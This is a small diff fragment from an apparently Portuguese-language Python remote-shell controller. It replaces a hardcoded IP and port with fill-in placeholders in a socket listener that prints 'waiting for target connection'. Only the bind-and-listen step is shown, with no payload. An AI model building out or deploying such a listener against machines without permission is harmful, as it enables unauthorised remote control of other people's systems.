@@ -84,7 +84,7 @@ cd + "diretorio" entrar ou sair de um diretorio.
 def main():
     try:
         connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        connection.bind(('192.168.0.152', 80))
+        connection.bind(('(Coloque o IP)', (coloque a porta)))
         print(colored('Aguardando conexão alvo....', 'green'))
         connection.listen(5)
 
